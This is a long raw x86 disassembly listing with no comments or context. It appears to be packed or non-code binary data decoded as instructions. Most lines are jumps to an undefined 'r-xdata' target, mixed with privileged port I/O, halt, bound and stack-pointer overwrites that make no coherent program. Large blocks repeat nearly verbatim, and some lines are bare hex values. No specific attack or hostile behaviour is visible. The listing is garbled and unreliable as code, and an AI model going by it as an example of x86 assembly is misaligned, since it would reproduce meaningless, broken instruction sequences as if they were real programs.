sub [ edi - 0x5199cf28 ] 0x3bbb863
jpo r-xdata
sahf
pop es
pushad
sub al 0x2
dec ecx
in al dx
jmp r-xdata
jmp r-xdata
dec edi
jmp r-xdata
jmp r-xdata
in al 0x68
add esi ecx
jmp r-xdata
jmp r-xdata
jpo r-xdata
insd
jpo r-xdata
jpo r-xdata
adc al 0x9d
mov ebx 0xebea3902
jmp r-xdata
bound ebp [ ebp + 0x7b ]
jmp r-xdata
jmp r-xdata
mov ebx 0x6d62bc89
jpo r-xdata
mov esp 0x68ebebaa
jpo r-xdata
cmpsb [ esi ] [ edi ]
push 0x17
jpo r-xdata
mov esp 0xeb4f6d62
jmp r-xdata
pushad
scasb [ edi ]
adc esp [ edx - 0x52 ]
add esp [ eax - 0x52 ]
pop ds
bound ebp [ esi - 0x205dfdf9 ]
jmp r-xdata
jpo r-xdata
pushad
scasb [ edi ]
pop ss
pop ds
rcl [ esi ] cl
sar [ ecx - 0x44 ] 0x62
insd
outsd
jmp r-xdata
jg r-xdata
sub [ ebx ] 0x6f
jmp r-xdata
pushad
sub ebp ebx
jmp r-xdata
or edi [ edx - 0x1433c7fe ]
jmp r-xdata
scasb [ edi ]
adc esp [ esi - 0x5a ]
bound ebp [ esi - 0xcffdf1 ]
jmp r-xdata
dec ecx
bound esi [ esi + 0x1fa66217 ]
bound edi [ esi + 0x17ae6013 ]
adc al 0x14
add cl ch
adc [ esp + edx ] dl
jpo r-xdata
pop ss
int 0xa1
jmp r-xdata
adc edx [ esi ]
adc al 0x14
add ecx ebp
mov eax [ 0x6d60ebeb ]
push edi
jmp r-xdata
add ebp [ edi + 0x2ebebac ]
hlt
add ah [ ebp - 0xc ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
jecxz r-xdata
jmp r-xdata
jmp r-xdata
sub ebx 0xcbcf9f14
adc al 0xbd
lahf
adc al 0xaf
iretd
sbb eax 0x7bebebec
jpo r-xdata
jmp r-xdata
jpo r-xdata
0xeb81ebeb 0x2bd
jpo r-xdata
jpo r-xdata
imul eax ebp 0xffffffeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
cmpsd [ esi ] [ edi ]
mov eax 0xebe4c402
jpo r-xdata
jpo r-xdata
in al 0x6e
jpo r-xdata
jmp r-xdata
jmp r-xdata
jecxz r-xdata
add ah [ ebx + 0x7bebebe1 ]
jpo r-xdata
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al dx
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
pushad
jpo r-xdata
jmp r-xdata
jmp r-xdata
add al ah
jpo r-xdata
add ch [ ecx + 0x7bebebcf ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub esp esp
jpo r-xdata
outsb
jpo r-xdata
dec edi
add edx [ ebx - 0x58 ]
jmp r-xdata
jpo r-xdata
or [ eax - 0x2060fdcd ] 0x7b7bebeb
jpo r-xdata
lea esp [ edx - 0x62 ]
or [ ebp + 0x628d3560 ] esi
mov dh 0xf
jpo r-xdata
push ebp
cmc
jmp r-xdata
in al 0xeb
jpo r-xdata
jmp r-xdata
adc al 0x2
test al 0xf3
jpo r-xdata
mov ebx 0xeb477d14
jmp r-xdata
jpo r-xdata
adc al 0x7d
or ebp ebx
jmp r-xdata
outsd
jpo r-xdata
in al 0x6f
jpo r-xdata
jmp r-xdata
push ebx
test al 0xeb
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x5a ]
sub [ edx - 0x28fd617f ] esi
scasd [ edi ]
sti
cmp esp esp
pop esp
cli
add al [ ecx ]
iretd
scasb [ edi ]
jecxz r-xdata
mov ch 0xb0
add dh [ esi - 0x6 ]
jmp r-xdata
add ch [ ecx + 0x2cebebf3 ]
add al [ esi ]
out 0xeb eax
jmp r-xdata
adc al 0xbc
jecxz r-xdata
test eax 0x7bebebcf
outsb
jge r-xdata
jpo r-xdata
scasd [ edi ]
iretd
in eax 0xeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
fucomip st3
jmp r-xdata
iretd
mov ebx 0x222d88f
mov ecx 0x7bebebf3
jpo r-xdata
jpo r-xdata
jmp r-xdata
scasb [ edi ]
test eax 0x2cebebf3
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
shr [ edi + 0x28a3efcf ] 0x7b
jpo r-xdata
sub edx 0xebc0a702
jmp r-xdata
jmp r-xdata
shr bl 0xeb
in al 0x6f
jge r-xdata
mov esp 0xa702ea81
bound ebp [ edi - 0x4fd0831 ]
push ss
adc al 0x14
jpo r-xdata
scasb [ edi ]
jg r-xdata
jpo r-xdata
adc al 0xfe
inc edi
jmp r-xdata
stc
imul bl
0x2ebebd7 0xcfa9
in al 0x6f
jmp r-xdata
jmp r-xdata
mov eax 0xebe70602
pop ss
pop [ edi - 0x44eb1479 ]
xchg ebx eax
sbb al 0x33
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
outsb
sub esp esp
outsd
in eax 0xeb
jmp r-xdata
pushad
sbb eax [ edx ]
aas
std
jmp r-xdata
jmp r-xdata
jpo r-xdata
scasb [ edi ]
jmp r-xdata
jmp r-xdata
pop es
jg r-xdata
jpo r-xdata
mov ebp 0xebd9c202
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
out dx eax
mov [ 0x7b7b7b28 ] eax
sbb ecx [ ebp - 0x4af6619e ]
pushad
xor eax 0xfb6628d
jpo r-xdata
jmp r-xdata
jmp r-xdata
add ch dl
imul ebx
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
fldpi
inc edi
jmp r-xdata
jmp r-xdata
and ch [ eax ]
jpo r-xdata
add dl [ esi ]
or eax ebp
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x65
loope r-xdata
sti
jmp r-xdata
bound esp [ esi - 0x617e4dd7 ]
bound ebx [ esi + 0x3560b509 ]
lea esp [ edx - 0x4a ]
jno 0x27a2990
pushad
add dl bh
xor ecx 0xb7d14b8
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x7d
out dx eax
jpo r-xdata
scasd [ edi ]
iretd
scasd [ edi ]
jmp r-xdata
push ss
lodsd [ esi ]
jmp r-xdata
add [ ebp - 0x8519d73 ] 0x628d2960
scasb [ edi ]
jpo r-xdata
psubusw mm5 mm3
jmp sub_46caeb
lahf
xor eax ebp
jmp sub_46ca5e
call 0x30b5b658
in al 0x6f
jpo r-xdata
lea esp [ edx - 0x52 ]
xor eax [ edx ]
0xbeebebf7 0x760
adc al 0xeb
jmp r-xdata
insd
sbb eax 0xad021414
int1
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc al 0xbb
sub edx 0xffffffeb
jmp sub_46cc07
jpo r-xdata
cmc
mov bl 0x2
dec ch
jmp r-xdata
lea esp [ edx - 0x52 ]
mul [ eax + 0x29 ]
lea esp [ edx - 0x52 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jge r-xdata
jmp r-xdata
outsd
mov ah 0xef
xor ah ah
outsd
out dx eax
pushad
xchg edi eax
iretd
mov dh 0x57
lea esp [ edx - 0x42 ]
sub eax [ edx ]
mov al [ 0x7b141410 ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
bound esi [ esi - 0x516ffce5 ]
jmp sub_46caa6
scasb [ edi ]
pop ss
bound ebp [ esi + 0x11f6020f ]
adc al 0x14
lea esp [ edx - 0x1 ]
0xe41bd0ad 0xf69
fldpi
jmp r-xdata
and [ eax + 0x2b6eebeb ] ch
in al 0x6f
test eax 0x66ebebe5
cmpsb [ esi ] [ edi ]
pop edi
scasb [ edi ]
jmp r-xdata
fsubp st3
jpo r-xdata
and ah ah
outsd
scasb [ edi ]
fldpi
jmp r-xdata
jmp sub_46cbcc
jpo r-xdata
xchg esi eax
adc [ esp + edx ] edx
jpo r-xdata
adc al 0xe4
outsd
add dl [ edx ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jge r-xdata
add ecx [ eax + eax * 8 + 0x2b2ebeb ]
arpl ax sp
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add bh dh
jmp r-xdata
add ah [ esi + 0x7b141410 ]
jpo r-xdata
jmp r-xdata
xor eax 0x11b6628d
pushad
xor ecx [ ebp - 0x27e8499e ]
xor [ ebp + 0x215b662 ] cl
cmpsb [ esi ] [ edi ]
in eax 0xeb
jmp r-xdata
jpo r-xdata
test [ ebp + 0x60f7ae62 ] ecx
sub [ ebp - 0x4c0a519e ] ecx
jpo r-xdata
jmp r-xdata
int1
pushad
int 0xeb
jmp r-xdata
bound ebp [ esi - 0x72d69f09 ]
bound ebp [ esi - 0x1fd4c0b ]
jmp r-xdata
mov esp 0x31bb662
nop
scasb [ edi ]
lea esp [ edx - 0x4a ]
adc [ eax + 0x33 ] esp
lea esp [ edx - 0x4a ]
pop ss
fdiv [ eax ]
lea esp [ edx - 0x4a ]
adc eax 0xebdaa602
jmp r-xdata
add esi esi
stosb [ edi ]
jmp r-xdata
mul [ eax - 0x5b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
and [ eax + eax ] 0xffffffd3
add eax 0xaae402bc
jmp r-xdata
sub esp esp
outsd
push 0x1f
adc al 0x14
pushad
mov edi 0x2968fbcf
out dx eax
outsw
iretd
mov eax 0xb3ad62bc
add edi edi
loop r-xdata
retn
pushad
movsd [ edi ] [ esi ]
jmp r-xdata
adc al 0x14
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub edi [ ebp + 0x13ae62bc ]
bound ebp [ esi + 0x129d021f ]
jpo r-xdata
test [ ebx ] dl
jpo r-xdata
adc al 0x14
jpo r-xdata
push esp
jpo r-xdata
jmp 0x3549b958
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor eax 0x14ebebf1
jge r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmpsb [ esi ] [ edi ]
inc [ edx ]
out dx eax
add ch [ eax ]
mov dl 0x2
test [ ebp + 0x608dbe62 ] ecx
cmp eax [ edx ]
jb r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x6a ]
jge r-xdata
mov eax 0xebfb1d02
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in al 0x5d
adc eax eax
sub al 0x2
sub_46c561
add edi [ ebp - 0x7c141406 ]
or al 0xec
imul ebx [ esi ] 0xffffffbc
bound ebp [ ebp + 0x7f ]
jmp r-xdata
insd
jpo r-xdata
outsd
push 0x17
jmp r-xdata
pop ds
rcl [ esi ] cl
sar [ ecx - 0x44 ] 0x62
adc al 0x14
add cl ch
adc [ esp + edx ] dl
jpo r-xdata
pop ss
sub_46c5cd
jpo r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x52 ]
leave
add al dh
shr ebx 0xeb
jpo r-xdata
jpo r-xdata
jpo r-xdata
bound edi [ esi + 0x23a600f ]

add eax [ edx + 0x2ebebfb ]
lodsd [ esi ]
jmp r-xdata
jpo r-xdata
push esp
clc
mov esi 0x23a600f
sti
jmp r-xdata
outsb
jmp r-xdata
add bl dh
lodsb [ esi ]
jmp r-xdata
outsb
sub eax [ edx ]
push eax
scasb [ edi ]
jmp r-xdata
jne r-xdata
add esi [ ebp - 0x3 ]
jmp r-xdata
push 0xeb83e72f
imul ebp ebx 0xffffffeb
mov eax 0xf3cf9f14
adc al 0xbd
lahf
sub_46c5d6
sub esp esp
outsb
and al ch
jmp r-xdata
std
mov ebx 0x7bebebe7
jpo r-xdata
scasb [ edi ]
jpo r-xdata
jpo r-xdata
bound edi [ esi + 0x23a600f ]
add al dh
jpo r-xdata
jpo r-xdata
jpo r-xdata
leave
lea esp [ edx - 0x52 ]
shr ebx 0xeb
jpo r-xdata
jpo r-xdata

add eax [ edx + 0x2ebebfb ]
lodsd [ esi ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
push esp
clc
jmp r-xdata
mov esi 0x23a600f
sti
jmp r-xdata
outsb
lar esi [ eax ]
adc [ esp + edx ] edx
mov ebx 0xacde02bc
in eax dx
jmp r-xdata
pop es
add bh ch
jmp r-xdata
outsb
sub eax [ edx ]
push eax
scasb [ edi ]
jmp r-xdata
jmp r-xdata
add bl dh
lodsb [ esi ]
jne r-xdata
add esi [ ebp - 0x3 ]
jmp r-xdata
push 0xeb83e72f
imul ebp ebx 0xffffffeb
mov eax 0xf3cf9f14
adc al 0xbd
lahf
sub_46c5eb
add al dh
enter 0xebeb 0x7b
mov esp 0xcf9f14b8
add edi [ ecx ]
mov [ 0x2f68ebeb ] eax
out 0x83 eax
jmp r-xdata
jpo r-xdata
jpo r-xdata
popfd
mov esp 0x57cf6f66
in al 0x6e
cmpsb [ esi ] [ edi ]
jpo r-xdata
pushad
scasb [ edi ]
pop ss
or edi [ edx - 0x1433c7fe ]
jmp r-xdata
jpo r-xdata
bound ebp [ esi - 0xcffdf1 ]
jmp r-xdata
dec ecx
bound esi [ esi + 0x1fa66217 ]
bound edi [ esi + 0x17ae6013 ]
cmp eax [ edx ]
inc eax
adc edx [ esp + edx ]
jpo r-xdata
mov esp 0x66bcbcbc
outsd
iretd
jpo r-xdata
jmp 0x1502b2f5
mov esp 0xcf6f66bc
push edi
jpo r-xdata
jpo r-xdata
leave
cmc
jmp r-xdata
outsb
adc al 0x14
jpo r-xdata
mov esp 0x68ebebaa
jpo r-xdata
jpo r-xdata
mov ebx 0xebea3902
jmp r-xdata
adc al 0x9d
jmp r-xdata
jpo r-xdata
sub [ ebx ] 0x6f
jmp r-xdata
pushad
sub ebp ebx
jmp r-xdata
scasb [ edi ]
adc esp [ esi - 0x5a ]
int 0xa1
jmp r-xdata
adc edx [ esi ]
adc al 0x14
add ecx ebp
mov eax [ 0x6d60ebeb ]
push edi
jmp r-xdata
add ebp [ edi + 0x2ebebac ]
hlt
add ah [ ebp - 0xc ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
jecxz r-xdata
jmp r-xdata
jmp r-xdata
sub ebx 0xcbcf9f14
adc al 0xbd
lahf
adc al 0xaf
iretd
sbb eax 0x7bebebec
jpo r-xdata
jmp r-xdata
jpo r-xdata
0xeb81ebeb 0x2bd
jpo r-xdata
jpo r-xdata
imul eax ebp 0xffffffeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
cmpsd [ esi ] [ edi ]
mov eax 0xebe4c402
jpo r-xdata
jpo r-xdata
in al 0x6e
jpo r-xdata
jmp r-xdata
jmp r-xdata
jecxz r-xdata
add ah [ ebx + 0x7bebebe1 ]
jpo r-xdata
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al dx
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
pushad
jpo r-xdata
jmp r-xdata
jmp r-xdata
add al ah
jpo r-xdata
add ch [ ecx + 0x7bebebcf ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub esp esp
jpo r-xdata
outsb
jpo r-xdata
dec edi
add edx [ ebx - 0x58 ]
jmp r-xdata
jpo r-xdata
or [ eax - 0x2060fdcd ] 0x7b7bebeb
jpo r-xdata
lea esp [ edx - 0x62 ]
or [ ebp + 0x628d3560 ] esi
mov dh 0xf
jpo r-xdata
push ebp
cmc
jmp r-xdata
in al 0xeb
jpo r-xdata
jmp r-xdata
adc al 0x2
test al 0xf3
jpo r-xdata
mov ebx 0xeb477d14
jmp r-xdata
jpo r-xdata
adc al 0x7d
or ebp ebx
jmp r-xdata
outsd
jpo r-xdata
in al 0x6f
jpo r-xdata
jmp r-xdata
push ebx
test al 0xeb
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x5a ]
sub [ edx - 0x28fd617f ] esi
scasd [ edi ]
sti
cmp esp esp
pop esp
cli
add al [ ecx ]
iretd
scasb [ edi ]
jecxz r-xdata
mov ch 0xb0
add dh [ esi - 0x6 ]
jmp r-xdata
add ch [ ecx + 0x2cebebf3 ]
add al [ esi ]
out 0xeb eax
jmp r-xdata
adc al 0xbc
jecxz r-xdata
test eax 0x7bebebcf
outsb
jge r-xdata
jpo r-xdata
scasd [ edi ]
iretd
in eax 0xeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
fucomip st3
jmp r-xdata
iretd
mov ebx 0x222d88f
mov ecx 0x7bebebf3
jpo r-xdata
jpo r-xdata
jmp r-xdata
scasb [ edi ]
test eax 0x2cebebf3
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
shr [ edi + 0x28a3efcf ] 0x7b
jpo r-xdata
sub edx 0xebc0a702
jmp r-xdata
jmp r-xdata
shr bl 0xeb
in al 0x6f
jge r-xdata
mov esp 0xa702ea81
bound ebp [ edi - 0x4fd0831 ]
push ss
adc al 0x14
jpo r-xdata
scasb [ edi ]
jg r-xdata
jpo r-xdata
adc al 0xfe
inc edi
jmp r-xdata
stc
imul bl
0x2ebebd7 0xcfa9
in al 0x6f
jmp r-xdata
jmp r-xdata
mov eax 0xebe70602
pop ss
pop [ edi - 0x44eb1479 ]
xchg ebx eax
sbb al 0x33
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
outsb
sub esp esp
outsd
in eax 0xeb
jmp r-xdata
pushad
sbb eax [ edx ]
aas
std
jmp r-xdata
jmp r-xdata
jpo r-xdata
scasb [ edi ]
jmp r-xdata
jmp r-xdata
pop es
jg r-xdata
jpo r-xdata
mov ebp 0xebd9c202
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
out dx eax
mov [ 0x7b7b7b28 ] eax
sbb ecx [ ebp - 0x4af6619e ]
pushad
xor eax 0xfb6628d
jpo r-xdata
jmp r-xdata
jmp r-xdata
add ch dl
imul ebx
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
fldpi
inc edi
jmp r-xdata
jmp r-xdata
and ch [ eax ]
jpo r-xdata
add dl [ esi ]
or eax ebp
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x65
loope r-xdata
sti
jmp r-xdata
bound esp [ esi - 0x617e4dd7 ]
bound ebx [ esi + 0x3560b509 ]
lea esp [ edx - 0x4a ]
jno 0x27a2990
pushad
add dl bh
xor ecx 0xb7d14b8
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x7d
out dx eax
jpo r-xdata
scasd [ edi ]
iretd
scasd [ edi ]
jmp r-xdata
push ss
lodsd [ esi ]
jmp r-xdata
add [ ebp - 0x8519d73 ] 0x628d2960
scasb [ edi ]
jpo r-xdata
psubusw mm5 mm3
jmp sub_46caeb
lahf
xor eax ebp
jmp sub_46ca5e
call 0x30b5b658
in al 0x6f
jpo r-xdata
lea esp [ edx - 0x52 ]
xor eax [ edx ]
0xbeebebf7 0x760
adc al 0xeb
jmp r-xdata
insd
sbb eax 0xad021414
int1
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc al 0xbb
sub edx 0xffffffeb
jmp sub_46cc07
jpo r-xdata
cmc
mov bl 0x2
dec ch
jmp r-xdata
lea esp [ edx - 0x52 ]
mul [ eax + 0x29 ]
lea esp [ edx - 0x52 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jge r-xdata
jmp r-xdata
outsd
mov ah 0xef
xor ah ah
outsd
out dx eax
pushad
xchg edi eax
iretd
mov dh 0x57
lea esp [ edx - 0x42 ]
sub eax [ edx ]
mov al [ 0x7b141410 ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
bound esi [ esi - 0x516ffce5 ]
jmp sub_46caa6
scasb [ edi ]
pop ss
bound ebp [ esi + 0x11f6020f ]
adc al 0x14
lea esp [ edx - 0x1 ]
0xe41bd0ad 0xf69
fldpi
jmp r-xdata
and [ eax + 0x2b6eebeb ] ch
in al 0x6f
test eax 0x66ebebe5
cmpsb [ esi ] [ edi ]
pop edi
scasb [ edi ]
jmp r-xdata
fsubp st3
jpo r-xdata
and ah ah
outsd
scasb [ edi ]
fldpi
jmp r-xdata
jmp sub_46cbcc
jpo r-xdata
xchg esi eax
adc [ esp + edx ] edx
jpo r-xdata
adc al 0xe4
outsd
add dl [ edx ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jge r-xdata
add ecx [ eax + eax * 8 + 0x2b2ebeb ]
arpl ax sp
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add bh dh
jmp r-xdata
add ah [ esi + 0x7b141410 ]
jpo r-xdata
jmp r-xdata
xor eax 0x11b6628d
pushad
xor ecx [ ebp - 0x27e8499e ]
xor [ ebp + 0x215b662 ] cl
cmpsb [ esi ] [ edi ]
in eax 0xeb
jmp r-xdata
jpo r-xdata
test [ ebp + 0x60f7ae62 ] ecx
sub [ ebp - 0x4c0a519e ] ecx
jpo r-xdata
jmp r-xdata
int1
pushad
int 0xeb
jmp r-xdata
bound ebp [ esi - 0x72d69f09 ]
bound ebp [ esi - 0x1fd4c0b ]
jmp r-xdata
mov esp 0x31bb662
nop
scasb [ edi ]
lea esp [ edx - 0x4a ]
adc [ eax + 0x33 ] esp
lea esp [ edx - 0x4a ]
pop ss
fdiv [ eax ]
lea esp [ edx - 0x4a ]
adc eax 0xebdaa602
jmp r-xdata
add esi esi
stosb [ edi ]
jmp r-xdata
mul [ eax - 0x5b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
and [ eax + eax ] 0xffffffd3
add eax 0xaae402bc
jmp r-xdata
sub esp esp
outsd
push 0x1f
adc al 0x14
pushad
mov edi 0x2968fbcf
out dx eax
outsw
iretd
mov eax 0xb3ad62bc
add edi edi
loop r-xdata
retn
pushad
movsd [ edi ] [ esi ]
jmp r-xdata
adc al 0x14
sub edi 0xffffffea
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub edi [ ebp + 0x13ae62bc ]
bound ebp [ esi + 0x129d021f ]
jpo r-xdata
test [ ebx ] dl
jpo r-xdata
adc al 0x14
jpo r-xdata
push esp
jpo r-xdata
jmp 0x3549b958
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor eax 0x14ebebf1
jge r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmpsb [ esi ] [ edi ]
inc [ edx ]
out dx eax
add ch [ eax ]
mov dl 0x2
test [ ebp + 0x608dbe62 ] ecx
cmp eax [ edx ]
jb r-xdata
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x6a ]
jge r-xdata
mov eax 0xebfb1d02
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
in al 0x5d
adc eax eax
sub al 0x2
sub_46c624
outsb
push edi
adc [ esp + edx ] edx
mov ebx 0xacde02bc
jmp r-xdata
outsb
sub eax [ edx ]
push eax
scasb [ edi ]
jmp r-xdata
jne r-xdata
add esi [ ebp - 0x3 ]
jmp r-xdata
push 0xeb83e72f
imul ebp ebx 0xffffffeb
mov eax 0xf3cf9f14
adc al 0xbd
lahf
sub_46c632
bound ebp [ esi - 0x72d29f35 ]
bound ebp [ esi - 0x3e39fd37 ]
jmp r-xdata
add bl dh
lodsb [ esi ]
jmp r-xdata
outsb
sub eax [ edx ]
push eax
scasb [ edi ]
jmp r-xdata
jne r-xdata
add esi [ ebp - 0x3 ]
jmp r-xdata
push 0xeb83e72f
imul ebp ebx 0xffffffeb
mov eax 0xf3cf9f14
adc al 0xbd
lahf
sub_46c7f0
jpo r-xdata
sbb al 0x33
jpo r-xdata
pushad
sbb ecx [ ebp - 0x4af6619e ]
pushad
xor eax 0xfb6628d
jpo r-xdata
add ah [ ebx + 0x7bebebe1 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
or [ eax - 0x2060fdcd ] 0x7b7bebeb
jpo r-xdata
lea esp [ edx - 0x62 ]
or [ ebp + 0x628d3560 ] esi
mov dh 0xf
jpo r-xdata
mov es [ edx ]
cmpsb [ esi ] [ edi ]
pop ss
adc al 0x14
jpo r-xdata
push ebx
test al 0xeb
jmp r-xdata
jpo r-xdata
lea esp [ edx - 0x5a ]
sub [ edx - 0x28fd617f ] esi
scasd [ edi ]
sti
cmp esp esp
pop esp
cli
add al [ ecx ]
iretd
scasb [ edi ]
jecxz r-xdata
sub ebx 0xeb477d14
jmp r-xdata
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
fucomip st3
jmp r-xdata
iretd
mov ebx 0x222d88f
mov ecx 0x7bebebf3
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc al 0xfe
inc edi
jmp r-xdata
jmp r-xdata
outsb
jpo r-xdata
stc
imul bl
in al 0x6f
0x2ebebd7 0xcfa9
jpo r-xdata
xor eax [ edx ]
jpo r-xdata
adc al 0x7b
jpo r-xdata
outsb
jpo r-xdata
in al 0x6f
jpo r-xdata
mov [ 0x7bebebe1 ] eax
or [ esi + 0x1417a602 ] 0x817b7b14
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
in al 0x65
loope r-xdata
bound ebp [ edi - 0x4fd0831 ]
push ss
adc al 0x14
jpo r-xdata
scasb [ edi ]
jg r-xdata
jpo r-xdata
jpo r-xdata
lodsd [ esi ]
jmp r-xdata
add [ ebp - 0x8519d73 ] 0x628d2960
scasb [ edi ]
jpo r-xdata
psubusw mm5 mm3
jmp sub_46caeb
pop es
jg r-xdata
jpo r-xdata
jmp r-xdata
mov ebp 0xebd9c202
jmp r-xdata
mov esp 0xa702ea81
shr bl 0xeb
in al 0x6f
jge r-xdata
jmp r-xdata
adc al 0x2
test al 0xf3
jmp r-xdata
adc al 0xbb
sub edx 0xffffffeb
jmp sub_46cc07
jpo r-xdata
cmc
mov bl 0x2
dec ch
jmp r-xdata
lea esp [ edx - 0x52 ]
mul [ eax + 0x29 ]
lea esp [ edx - 0x52 ]
jpo r-xdata
inc edi
jmp r-xdata
jmp r-xdata
and ch [ eax ]
jpo r-xdata
add dl [ esi ]
dec edi
add edx [ ebx - 0x58 ]
or eax ebp
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
0xeb81ebeb 0x2bd
mov dh 0x57
lea esp [ edx - 0x42 ]
sub eax [ edx ]
mov al [ 0x7b141410 ]
jpo r-xdata
mov bl 0x81
jpo r-xdata
bound esi [ esi - 0x516ffce5 ]
jmp r-xdata
adc al 0x7d
out dx eax
jpo r-xdata
scasd [ edi ]
iretd
scasd [ edi ]
jmp r-xdata
push ss
jmp r-xdata
fldpi
jmp r-xdata
jpo r-xdata
test eax 0x2cebebf3
scasb [ edi ]
pop ss
pop [ edi - 0x44eb1479 ]
xchg ebx eax
fsubp st3
jpo r-xdata
and ah ah
outsd
scasb [ edi ]
fldpi
jmp r-xdata
jmp sub_46cbcc
jpo r-xdata
xchg esi eax
adc [ esp + edx ] edx
jpo r-xdata
insd
sbb eax 0xad021414
int1
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub esp esp
jpo r-xdata
add dl [ edx ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
jge r-xdata
add ecx [ eax + eax * 8 + 0x2b2ebeb ]
arpl ax sp
jmp r-xdata
jpo r-xdata
jmp r-xdata
outsd
mov ah 0xef
xor ah ah
outsd
out dx eax
pushad
sbb eax [ edx ]
aas
std
jmp r-xdata
pushad
xchg edi eax
iretd
adc al 0x7d
or ebp ebx
jmp r-xdata
outsd
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
add bh dh
jmp r-xdata
add ah [ esi + 0x7b141410 ]
jpo r-xdata
add ch dl
imul ebx
jmp r-xdata
scasd [ edi ]
iretd
in eax 0xeb
jmp r-xdata
jpo r-xdata
jmp r-xdata
xor eax 0x11b6628d
pushad
xor ecx [ ebp - 0x27e8499e ]
xor [ ebp + 0x215b662 ] cl
cmpsb [ esi ] [ edi ]
in eax 0xeb
jmp r-xdata
jpo r-xdata
test [ ebp + 0x60f7ae62 ] ecx
sub [ ebp - 0x4c0a519e ] ecx
jpo r-xdata
jmp r-xdata
shr [ edi + 0x28a3efcf ] 0x7b
jpo r-xdata
sub edx 0xebc0a702
jmp r-xdata
jmp r-xdata
int1
pushad
int 0xeb
jmp r-xdata
bound ebp [ esi - 0x72d69f09 ]
bound ebp [ esi - 0x1fd4c0b ]
jmp r-xdata
mov esp 0x31bb662
nop
scasb [ edi ]
jmp r-xdata
jpo r-xdata
scasb [ edi ]
jmp r-xdata
lea esp [ edx - 0x4a ]
adc [ eax + 0x33 ] esp
lea esp [ edx - 0x4a ]
pop ss
fdiv [ eax ]
lea esp [ edx - 0x4a ]
adc eax 0xebdaa602
jmp r-xdata
add esi esi
stosb [ edi ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
mul [ eax - 0x5b ]
jpo r-xdata
sti
jmp r-xdata
add dl bh
xor ecx 0xb7d14b8
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
xor eax ebp
jmp sub_46ca5e
call 0x30b5b658
in al 0x6f
jpo r-xdata
lea esp [ edx - 0x52 ]
xor eax [ edx ]
0xbeebebf7 0x760
adc al 0xeb
jmp r-xdata
and [ eax + eax ] 0xffffffd3
add eax 0xaae402bc
jmp r-xdata
sub esp esp
outsd
push 0x1f
adc al 0x14
pushad
mov edi 0x2968fbcf
out dx eax
outsw
iretd
jmp r-xdata
jpo r-xdata
jge r-xdata
mov eax 0xb3ad62bc
add edi edi
loop r-xdata
jmp sub_46caa6
